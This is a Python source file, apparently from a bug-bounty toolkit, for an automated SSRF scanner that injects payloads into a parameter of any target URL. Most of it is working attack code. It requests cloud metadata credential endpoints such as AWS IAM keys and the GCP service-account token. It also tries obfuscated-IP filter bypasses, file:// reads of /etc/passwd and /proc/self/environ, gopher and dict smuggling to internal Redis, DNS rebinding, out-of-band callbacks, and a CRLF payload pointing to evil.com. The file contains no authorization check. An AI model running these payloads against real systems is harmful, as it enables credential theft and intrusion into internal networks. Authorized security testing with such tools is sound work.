"""
SSRF Tester Agent

Comprehensive Server-Side Request Forgery (SSRF) testing agent.

Tests for:
- Cloud metadata endpoints (AWS, Azure, GCP, Alibaba, Oracle)
- Internal network scanning (localhost, private IPs)
- Protocol smuggling (file://, dict://, gopher://, ftp://)
- URL encoding and bypass techniques
- Decimal/Octal/Hex IP obfuscation
- DNS rebinding attacks
- Blind SSRF detection
- Time-based detection
- HTTP redirect chains
- CRLF injection in URLs

Author: BountyHound Team
Version: 1.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import ipaddress
import logging
import requests
import time
import socket
import re
from typing import List, Dict, Optional, Tuple
from urllib.parse import urlparse, quote, urlencode
from dataclasses import dataclass, field
from datetime import datetime
from colorama import Fore, Style
from engine.core.db_hooks import DatabaseHooks
from engine.core.database import BountyHoundDB
from engine.core.payload_hooks import PayloadHooks

logger = logging.getLogger(__name__)


@dataclass
class SSRFTest:
    """Represents a single SSRF test."""
    name: str
    payload: str
    category: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW, INFO
    description: str
    detection_method: str = "response_content"  # response_content, timing, dns, blind


@dataclass
class SSRFFinding:
    """Represents an SSRF vulnerability finding."""
    severity: str
    title: str
    category: str
    payload: str
    description: str
    evidence: Dict
    impact: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict:
        """Convert finding to dictionary."""
        return {
            'severity': self.severity,
            'title': self.title,
            'category': self.category,
            'payload': self.payload,
            'description': self.description,
            'evidence': self.evidence,
            'impact': self.impact,
            'timestamp': self.timestamp
        }


class SSRFTester:
    """
    Comprehensive SSRF vulnerability tester.

    Tests for SSRF vulnerabilities using multiple techniques:
    - Cloud metadata service access
    - Internal network scanning
    - Protocol smuggling
    - URL encoding bypasses
    - Blind SSRF detection
    """

    # Cloud metadata endpoints
    METADATA_ENDPOINTS = {
        'AWS': [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/dynamic/instance-identity/document',
        ],
        'Azure': [
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://169.254.169.254/metadata/identity/oauth2/token',
        ],
        'GCP': [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            'http://169.254.169.254/computeMetadata/v1/',
        ],
        'Alibaba': [
            'http://100.100.100.200/latest/meta-data/',
        ],
        'Oracle': [
            'http://192.0.0.192/latest/meta-data/',
        ],
        'DigitalOcean': [
            'http://169.254.169.254/metadata/v1/',
        ]
    }

    # Internal network targets
    INTERNAL_TARGETS = [
        'http://127.0.0.1',
        'http://localhost',
        'http://0.0.0.0',
        'http://[::1]',  # IPv6 localhost
        'http://192.168.1.1',
        'http://10.0.0.1',
        'http://172.16.0.1',
    ]

    # Protocol smuggling
    PROTOCOL_SCHEMES = [
        'file://',
        'dict://',
        'gopher://',
        'ftp://',
        'sftp://',
        'ldap://',
        'tftp://',
    ]

    def __init__(self, target_url: str, param_name: Optional[str] = None,
                 target: Optional[str] = None, timeout: int = 5,
                 oast_domain: Optional[str] = None):
        """
        Initialize SSRF tester.

        Args:
            target_url: Target URL to test (e.g., http://example.com/fetch)
            param_name: Parameter name to inject into (e.g., 'url').
                       If None, expects INJECT placeholder in target_url
            target: Target identifier for database tracking (default: extracted from URL)
            timeout: Request timeout in seconds
            oast_domain: Out-of-band (OAST) domain for blind SSRF detection
        """
        self.target_url = target_url
        self.param_name = param_name
        self.timeout = timeout
        self.oast_domain = oast_domain or "burpcollaborator.net"
        self.findings: List[SSRFFinding] = []
        self.tests_run = 0
        self.tests_passed = 0

        # Extract domain from URL for database tracking
        if target:
            self.target = target
        else:
            parsed = urlparse(target_url)
            self.target = parsed.netloc or "unknown-target"

        # Track timing baselines for blind SSRF
        self.timing_baseline: Optional[float] = None
        self.baseline_times: List[float] = []

    def run_all_tests(self) -> List[SSRFFinding]:
        """
        Run all SSRF tests.

        Returns:
            List of findings
        """
        # Database check
        print(f"{Fore.CYAN}[DATABASE] Checking history for {self.target}...{Style.RESET_ALL}")
        context = DatabaseHooks.before_test(self.target, 'ssrf_tester')

        if context['should_skip']:
            print(f"{Fore.YELLOW}[SKIP] {context['reason']}{Style.RESET_ALL}")
            if context.get('previous_findings'):
                print(f"Previous findings: {len(context['previous_findings'])}")
            return []
        else:
            print(f"{Fore.GREEN}[OK] {context['reason']}{Style.RESET_ALL}")

        print(f"{Fore.CYAN}[*] Starting comprehensive SSRF testing...{Style.RESET_ALL}")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Timeout: {self.timeout}s")

        # Establish timing baseline
        self._establish_timing_baseline()

        # Run all test categories
        self._test_cloud_metadata()
        self._test_internal_network()
        self._test_protocol_smuggling()
        self._test_url_encoding_bypass()
        self._test_ip_obfuscation()
        self._test_dns_rebinding()
        self._test_blind_ssrf()
        self._test_redirect_chains()
        self._test_crlf_injection()

        # Record results in database
        db = BountyHoundDB()
        db.record_tool_run(
            self.target,
            'ssrf_tester',
            findings_count=len(self.findings),
            duration_seconds=0,  # Can track if needed
            success=True
        )

        # Record successful payloads
        for finding in self.findings:
            if finding.severity in ['CRITICAL', 'HIGH']:
                PayloadHooks.record_payload_success(
                    payload_text=finding.payload,
                    vuln_type='SSRF',
                    context=finding.category,
                    notes=finding.title
                )

        print(f"\n{Fore.CYAN}=== SSRF TESTING COMPLETE ==={Style.RESET_ALL}")
        print(f"Tests run: {self.tests_run}")
        print(f"Findings: {len(self.findings)}")

        if self.findings:
            self._print_findings_summary()

        return self.findings

    def _establish_timing_baseline(self):
        """Establish timing baseline for blind SSRF detection."""
        self.baseline_times = []
        for _ in range(3):
            try:
                start = time.time()
                self._make_request("http://example.com", silent=True)
                elapsed = time.time() - start
                self.baseline_times.append(elapsed)
            except Exception as e:
                logger.warning("SSRF test error in _establish_timing_baseline: %s", e)
        if self.baseline_times:
            avg = sum(self.baseline_times) / len(self.baseline_times)
            self.timing_baseline = avg
            print(f"[*] Timing baseline: {avg:.3f}s (from {len(self.baseline_times)} samples)")
        else:
            self.timing_baseline = 1.0  # Default
            self.baseline_times = [1.0]
            print("[*] Timing baseline: 1.000s (default)")

    def _test_cloud_metadata(self):
        """Test for cloud metadata service access."""
        print(f"\n{Fore.YELLOW}[*] Testing cloud metadata endpoints...{Style.RESET_ALL}")

        for cloud_provider, endpoints in self.METADATA_ENDPOINTS.items():
            for endpoint in endpoints:
                self.tests_run += 1

                test = SSRFTest(
                    name=f"{cloud_provider} Metadata",
                    payload=endpoint,
                    category="Cloud Metadata",
                    severity="CRITICAL",
                    description=f"SSRF to {cloud_provider} metadata service",
                    detection_method="response_content"
                )

                finding = self._execute_test(test)
                if finding:
                    self.findings.append(finding)
                    self.tests_passed += 1

        # Test with bypass techniques
        self._test_metadata_bypasses()

    def _test_metadata_bypasses(self):
        """Test metadata access with bypass techniques."""
        aws_base = "169.254.169.254/latest/meta-data/"

        bypasses = [
            ("Decimal IP", f"http://2852039166/latest/meta-data/"),  # 169.254.169.254
            ("Octal IP", f"http://0251.0376.0251.0376/latest/meta-data/"),
            ("Hex IP", f"http://0xa9fea9fe/latest/meta-data/"),
            ("Mixed encoding", f"http://169.254.169.0xfe/latest/meta-data/"),
            ("Dot-less decimal", f"http://2852039166/latest/meta-data/"),
            ("IPv6 notation", f"http://[::ffff:a9fe:a9fe]/latest/meta-data/"),
        ]

        for name, payload in bypasses:
            self.tests_run += 1

            test = SSRFTest(
                name=f"AWS Metadata - {name}",
                payload=payload,
                category="Cloud Metadata Bypass",
                severity="CRITICAL",
                description=f"SSRF to AWS metadata using {name}",
                detection_method="response_content"
            )

            finding = self._execute_test(test)
            if finding:
                self.findings.append(finding)
                self.tests_passed += 1

    def _test_internal_network(self):
        """Test internal network scanning."""
        print(f"\n{Fore.YELLOW}[*] Testing internal network access...{Style.RESET_ALL}")

        for target in self.INTERNAL_TARGETS:
            self.tests_run += 1

            # Test common ports
            for port in [80, 443, 22, 3306, 5432, 6379, 27017]:
                payload = f"{target}:{port}"

                test = SSRFTest(
                    name=f"Internal Network - {target}:{port}",
                    payload=payload,
                    category="Internal Network",
                    severity="HIGH",
                    description=f"SSRF to internal network address {payload}",
                    detection_method="response_content"
                )

                finding = self._execute_test(test)
                if finding:
                    self.findings.append(finding)
                    self.tests_passed += 1

    def _test_protocol_smuggling(self):
        """Test protocol smuggling attacks."""
        print(f"\n{Fore.YELLOW}[*] Testing protocol smuggling...{Style.RESET_ALL}")

        for protocol in self.PROTOCOL_SCHEMES:
            self.tests_run += 1

            # Test file:// protocol
            if protocol == 'file://':
                payloads = [
                    f"{protocol}/etc/passwd",
                    f"{protocol}/c:/windows/win.ini",
                    f"{protocol}/proc/self/environ",
                ]
            # Test gopher:// protocol
            elif protocol == 'gopher://':
                payloads = [
                    f"{protocol}127.0.0.1:80/_GET%20/%20HTTP/1.1%0AHost:%20127.0.0.1",
                ]
            # Test dict:// protocol
            elif protocol == 'dict://':
                payloads = [
                    f"{protocol}127.0.0.1:6379/info",
                ]
            else:
                payloads = [f"{protocol}127.0.0.1/"]

            for payload in payloads:
                test = SSRFTest(
                    name=f"Protocol Smuggling - {protocol}",
                    payload=payload,
                    category="Protocol Smuggling",
                    severity="HIGH",
                    description=f"SSRF using {protocol} protocol",
                    detection_method="response_content"
                )

                finding = self._execute_test(test)
                if finding:
                    self.findings.append(finding)
                    self.tests_passed += 1

    def _test_url_encoding_bypass(self):
        """Test URL encoding bypass techniques."""
        print(f"\n{Fore.YELLOW}[*] Testing URL encoding bypasses...{Style.RESET_ALL}")

        base = "http://169.254.169.254/latest/meta-data/"

        bypasses = [
            ("Single encode", quote(base, safe='')),
            ("Double encode", quote(quote(base, safe=''), safe='')),
            ("Partial encode", f"http://169.254.169.254/latest/meta%2Ddata/"),
            ("Unicode encode", "http://169.254.169.254/latest/meta\\u002ddata/"),
        ]

        for name, payload in bypasses:
            self.tests_run += 1

            test = SSRFTest(
                name=f"URL Encoding - {name}",
                payload=payload,
                category="URL Encoding Bypass",
                severity="HIGH",
                description=f"SSRF bypass using {name}",
                detection_method="response_content"
            )

            finding = self._execute_test(test)
            if finding:
                self.findings.append(finding)
                self.tests_passed += 1

    def _test_ip_obfuscation(self):
        """Test IP address obfuscation techniques."""
        print(f"\n{Fore.YELLOW}[*] Testing IP obfuscation...{Style.RESET_ALL}")

        # 127.0.0.1 obfuscations
        localhost_obfuscations = [
            ("Decimal", "http://2130706433/"),  # 127.0.0.1
            ("Octal", "http://0177.0000.0000.0001/"),
            ("Hex", "http://0x7f.0x00.0x00.0x01/"),
            ("Mixed", "http://0x7f.0.0.1/"),
            ("Short decimal", "http://127.1/"),
            ("Shorter", "http://127.0.1/"),
        ]

        for name, payload in localhost_obfuscations:
            self.tests_run += 1

            test = SSRFTest(
                name=f"IP Obfuscation - {name}",
                payload=payload,
                category="IP Obfuscation",
                severity="MEDIUM",
                description=f"SSRF using {name} localhost representation",
                detection_method="response_content"
            )

            finding = self._execute_test(test)
            if finding:
                self.findings.append(finding)
                self.tests_passed += 1

    def _test_dns_rebinding(self):
        """Test DNS rebinding attacks."""
        print(f"\n{Fore.YELLOW}[*] Testing DNS rebinding...{Style.RESET_ALL}")

        # Common DNS rebinding services
        rebinding_domains = [
            f"127.0.0.1.{self.oast_domain}",
            f"169.254.169.254.{self.oast_domain}",
            "localtest.me",  # Resolves to 127.0.0.1
            "spoofed.burpcollaborator.net",
        ]

        for domain in rebinding_domains:
            self.tests_run += 1

            payload = f"http://{domain}/"

            test = SSRFTest(
                name=f"DNS Rebinding - {domain}",
                payload=payload,
                category="DNS Rebinding",
                severity="HIGH",
                description=f"SSRF using DNS rebinding domain {domain}",
                detection_method="dns"
            )

            finding = self._execute_test(test)
            if finding:
                self.findings.append(finding)
                self.tests_passed += 1

    def _test_blind_ssrf(self):
        """Test blind SSRF detection."""
        print(f"\n{Fore.YELLOW}[*] Testing blind SSRF...{Style.RESET_ALL}")

        # Out-of-band detection
        unique_id = f"{int(time.time())}"
        oast_url = f"http://{unique_id}.{self.oast_domain}"

        self.tests_run += 1

        test = SSRFTest(
            name="Blind SSRF - OAST",
            payload=oast_url,
            category="Blind SSRF",
            severity="MEDIUM",
            description="Blind SSRF detection via out-of-band callback",
            detection_method="blind"
        )

        finding = self._execute_test(test)
        if finding:
            self.findings.append(finding)
            self.tests_passed += 1

        # Time-based detection
        self._test_time_based_ssrf()

    def _test_time_based_ssrf(self):
        """Test time-based blind SSRF."""
        # Test with slow endpoint
        slow_endpoints = [
            "http://169.254.169.254:81/",  # Timeout port
            "http://example.com:9999/",  # Non-responsive port
        ]

        for endpoint in slow_endpoints:
            self.tests_run += 1

            test = SSRFTest(
                name=f"Time-based SSRF - {endpoint}",
                payload=endpoint,
                category="Time-based SSRF",
                severity="LOW",
                description="Blind SSRF detected via timing analysis",
                detection_method="timing"
            )

            finding = self._execute_test(test)
            if finding:
                self.findings.append(finding)
                self.tests_passed += 1

    def _test_redirect_chains(self):
        """Test SSRF via redirect chains."""
        print(f"\n{Fore.YELLOW}[*] Testing redirect chains...{Style.RESET_ALL}")

        # Would need a redirect service, but test the concept
        redirect_payloads = [
            "http://example.com/redirect?url=http://169.254.169.254/",
            "http://bit.ly/redirect-to-metadata",  # Example shortened URL
        ]

        for payload in redirect_payloads:
            self.tests_run += 1

            test = SSRFTest(
                name=f"Redirect Chain - {payload}",
                payload=payload,
                category="Redirect Chain",
                severity="MEDIUM",
                description="SSRF via HTTP redirect chain",
                detection_method="response_content"
            )

            finding = self._execute_test(test)
            if finding:
                self.findings.append(finding)
                self.tests_passed += 1

    def _test_crlf_injection(self):
        """Test CRLF injection in URLs."""
        print(f"\n{Fore.YELLOW}[*] Testing CRLF injection...{Style.RESET_ALL}")

        crlf_payloads = [
            "http://169.254.169.254/%0d%0aX-Injected-Header:%20value",
            "http://169.254.169.254/%0aLocation:%20http://evil.com",
        ]

        for payload in crlf_payloads:
            self.tests_run += 1

            test = SSRFTest(
                name=f"CRLF Injection - {payload}",
                payload=payload,
                category="CRLF Injection",
                severity="MEDIUM",
                description="SSRF with CRLF injection",
                detection_method="response_content"
            )

            finding = self._execute_test(test)
            if finding:
                self.findings.append(finding)
                self.tests_passed += 1

    def _execute_test(self, test: SSRFTest) -> Optional[SSRFFinding]:
        """
        Execute a single SSRF test.

        Args:
            test: SSRFTest to execute

        Returns:
            SSRFFinding if vulnerability found, None otherwise
        """
        try:
            if test.detection_method == "response_content":
                return self._test_response_content(test)
            elif test.detection_method == "timing":
                return self._test_timing(test)
            elif test.detection_method == "dns":
                return self._test_dns(test)
            elif test.detection_method == "blind":
                return self._test_blind(test)

        except Exception as e:
            logger.warning("SSRF test error in _execute_test (%s): %s", test.name, e)

        return None

    def _test_response_content(self, test: SSRFTest) -> Optional[SSRFFinding]:
        """Test for SSRF via response content analysis."""
        response = self._make_request(test.payload)

        if response and self._is_ssrf_response(response, test.category):
            return SSRFFinding(
                severity=test.severity,
                title=test.name,
                category=test.category,
                payload=test.payload,
                description=test.description,
                evidence={
                    'response_code': response.status_code,
                    'response_body': response.text[:500],
                    'response_headers': dict(response.headers)
                },
                impact=self._get_impact(test.category)
            )

        return None

    def _test_timing(self, test: SSRFTest) -> Optional[SSRFFinding]:
        """Timing-based SSRF detection with statistical threshold."""
        if not self.baseline_times:
            return None

        baseline_avg = sum(self.baseline_times) / len(self.baseline_times)
        baseline_std = (sum((t - baseline_avg) ** 2 for t in self.baseline_times) / len(self.baseline_times)) ** 0.5

        # Measure 3 test requests
        test_times = []
        for _ in range(3):
            start = time.time()
            try:
                self._make_request(test.payload, silent=True)
                test_times.append(time.time() - start)
            except Exception as e:
                logger.warning("SSRF test error in _test_timing: %s", e)
                continue

        if not test_times:
            return None

        test_avg = sum(test_times) / len(test_times)
        # Signal: test average exceeds baseline by more than 2.5 standard deviations
        threshold = baseline_avg + max(2.5 * baseline_std, 2.0)  # At least 2s difference

        if test_avg > threshold:
            return SSRFFinding(
                severity=test.severity,
                title=test.name,
                category=test.category,
                payload=test.payload,
                description=test.description,
                evidence={
                    'baseline_avg': f"{baseline_avg:.3f}s",
                    'baseline_std': f"{baseline_std:.3f}s",
                    'test_avg': f"{test_avg:.3f}s",
                    'threshold': f"{threshold:.3f}s",
                    'samples': len(test_times),
                },
                impact=self._get_impact(test.category)
            )

        return None

    def _test_dns(self, test: SSRFTest) -> Optional[SSRFFinding]:
        """Test for DNS resolution (simplified)."""
        # Extract domain from payload
        match = re.search(r'://([^/]+)', test.payload)
        if match:
            domain = match.group(1)
            try:
                # Check if domain resolves
                socket.gethostbyname(domain)

                # Make request
                response = self._make_request(test.payload)
                if response:
                    return SSRFFinding(
                        severity=test.severity,
                        title=test.name,
                        category=test.category,
                        payload=test.payload,
                        description=test.description,
                        evidence={
                            'domain_resolved': domain,
                            'response_code': response.status_code
                        },
                        impact=self._get_impact(test.category)
                    )
            except socket.gaierror:
                pass

        return None

    def _test_blind(self, test: SSRFTest) -> bool:
        """Test blind SSRF via OOB callback tracking."""
        if not self.oast_domain:
            return False  # No OOB server available

        callback_id = f"ssrf-{test.category.lower().replace(' ', '-')}-{hash(test.payload) % 10000}"
        callback_url = f"http://{callback_id}.{self.oast_domain}"

        try:
            resp = self._make_request(callback_url)
        except Exception as e:
            logger.warning("Blind SSRF request failed for %s: %s", callback_url, e)
            return False

        # Record pending callback for external correlation
        if not hasattr(self, '_pending_blind_tests'):
            self._pending_blind_tests = []
        self._pending_blind_tests.append({
            "callback_id": callback_id,
            "test": test.to_dict() if hasattr(test, 'to_dict') else str(test),
            "request_time": time.time(),
            "response_status": resp.status_code if resp else None,
        })
        # Cannot confirm until OOB callback is polled externally
        return False

    def _make_request(self, payload: str, silent: bool = False) -> Optional[requests.Response]:
        """
        Make HTTP request with injected payload.

        Args:
            payload: Payload to inject
            silent: Suppress output

        Returns:
            Response object or None
        """
        try:
            # Build request URL
            if self.param_name:
                # Inject into parameter
                test_url = f"{self.target_url}?{self.param_name}={quote(payload, safe='')}"
            else:
                # Replace INJECT placeholder
                test_url = self.target_url.replace("INJECT", payload)

            if not silent:
                print(f"  Testing: {payload[:80]}{'...' if len(payload) > 80 else ''}")

            response = requests.get(
                test_url,
                timeout=self.timeout,
                allow_redirects=False,
                verify=False  # For testing environments
            )

            return response

        except requests.exceptions.Timeout:
            return None
        except Exception as e:
            if not silent:
                print(f"  Error: {str(e)}")
            return None

    def _contains_internal_ip(self, text: str) -> bool:
        """Check if response contains RFC1918/link-local/loopback IPs."""
        ip_pattern = re.compile(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b')
        for match in ip_pattern.finditer(text):
            try:
                addr = ipaddress.ip_address(match.group(1))
                if addr.is_private or addr.is_link_local or addr.is_loopback:
                    return True
            except ValueError:
                continue
        return False

    def _is_ssrf_response(self, response: requests.Response, category: str) -> bool:
        """
        Check if response indicates SSRF vulnerability.

        Args:
            response: HTTP response
            category: Test category

        Returns:
            True if SSRF detected
        """
        text = response.text.lower()

        # Cloud metadata indicators
        if category in ["Cloud Metadata", "Cloud Metadata Bypass"]:
            indicators = [
                "ami-id", "instance-id", "security-credentials", "iam",
                "placement", "availability-zone", "public-ipv4",
                "accesskeyid", "secretaccesskey", "sessiontoken",
                "metadata", "computemetadata", "instance/service-accounts"
            ]
            return any(indicator.lower() in text for indicator in indicators) or self._contains_internal_ip(response.text)

        # Internal network indicators
        elif category == "Internal Network":
            indicators = [
                "apache", "nginx", "iis", "server:", "x-powered-by",
                "redis", "mysql", "postgresql", "mongodb"
            ]
            return any(indicator in text for indicator in indicators) or self._contains_internal_ip(response.text)

        # Protocol smuggling indicators
        elif category == "Protocol Smuggling":
            indicators = [
                "root:", "/bin/bash", "[extensions]", "proc/self",
                "redis_version", "# server"
            ]
            return any(indicator in text for indicator in indicators)

        # Generic SSRF indicators
        else:
            return response.status_code == 200 and len(response.text) > 0

    def _get_impact(self, category: str) -> str:
        """Get impact description for finding category."""
        impacts = {
            "Cloud Metadata": "Can retrieve cloud credentials (IAM keys), escalate privileges, access sensitive instance data",
            "Cloud Metadata Bypass": "Can bypass cloud metadata restrictions and retrieve credentials",
            "Internal Network": "Can scan internal network, access internal services, enumerate infrastructure",
            "Protocol Smuggling": "Can read local files, interact with internal services via alternative protocols",
            "URL Encoding Bypass": "Can bypass SSRF filters using encoded payloads",
            "IP Obfuscation": "Can bypass IP blacklists using alternative IP representations",
            "DNS Rebinding": "Can bypass DNS-based SSRF protections",
            "Blind SSRF": "Can trigger requests to attacker-controlled servers, potential data exfiltration",
            "Time-based SSRF": "Can confirm SSRF via timing differences",
            "Redirect Chain": "Can bypass SSRF protections via HTTP redirects",
            "CRLF Injection": "Can inject HTTP headers, manipulate responses"
        }
        return impacts.get(category, "Server-Side Request Forgery vulnerability")

    def _print_findings_summary(self):
        """Print summary of findings."""
        print(f"\n{Fore.RED}[!] SSRF VULNERABILITIES FOUND:{Style.RESET_ALL}")

        # Group by severity
        by_severity = {}
        for finding in self.findings:
            if finding.severity not in by_severity:
                by_severity[finding.severity] = []
            by_severity[finding.severity].append(finding)

        # Print by severity
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            if severity in by_severity:
                findings = by_severity[severity]
                print(f"\n{severity}: {len(findings)}")
                for f in findings[:3]:  # Show first 3
                    print(f"  - {f.title}")
                    print(f"    Payload: {f.payload[:60]}{'...' if len(f.payload) > 60 else ''}")

    def get_findings(self) -> List[SSRFFinding]:
        """Get all findings."""
        return self.findings

    def get_findings_by_severity(self, severity: str) -> List[SSRFFinding]:
        """Get findings by severity level."""
        return [f for f in self.findings if f.severity == severity]


def main():
    """CLI interface."""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python ssrf_tester.py <url_with_INJECT_placeholder> [oast_domain]")
        print("Example: python ssrf_tester.py 'http://example.com/fetch?url=INJECT'")
        print("         python ssrf_tester.py 'http://example.com/fetch?url=INJECT' 'burpcollaborator.net'")
        sys.exit(1)

    target_url = sys.argv[1]
    oast_domain = sys.argv[2] if len(sys.argv) > 2 else None

    tester = SSRFTester(target_url, oast_domain=oast_domain)
    findings = tester.run_all_tests()

    print(f"\n{Fore.CYAN}=== FINAL RESULTS ==={Style.RESET_ALL}")
    print(f"Total tests: {tester.tests_run}")
    print(f"Findings: {len(findings)}")

    if findings:
        print(f"\n{Fore.RED}[!] SSRF vulnerabilities detected!{Style.RESET_ALL}")
        print(f"Review findings and validate manually.")


if __name__ == "__main__":
    main()
